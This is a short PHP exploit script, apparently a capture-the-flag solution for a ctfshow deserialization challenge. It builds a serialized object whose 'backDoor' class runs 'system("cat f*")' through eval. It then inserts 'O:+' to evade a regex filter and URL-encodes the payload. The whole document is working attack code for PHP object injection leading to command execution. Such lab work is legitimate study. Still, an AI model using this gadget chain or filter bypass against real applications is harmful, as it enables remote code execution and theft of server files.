<?php
    class ctfShowUser
    {
        public $username='xxxxxx';
        public $password='xxxxxx';
        public $isVip=true;
        public $class='backDoor';
 
        public function __construct()
        {
            $this->class=new backDoor();
        }
    }
    class backDoor
    {
        public $code='system("cat f*");';
        public function getInfo()
        {
            eval($this->code);
        }
    }
 
    $ctfShowUserObj = new ctfShowUser();
    $a = serialize($ctfShowUserObj);
    $a = str_replace('O:','O:+',$a);
    echo urlencode($a);
 
?>
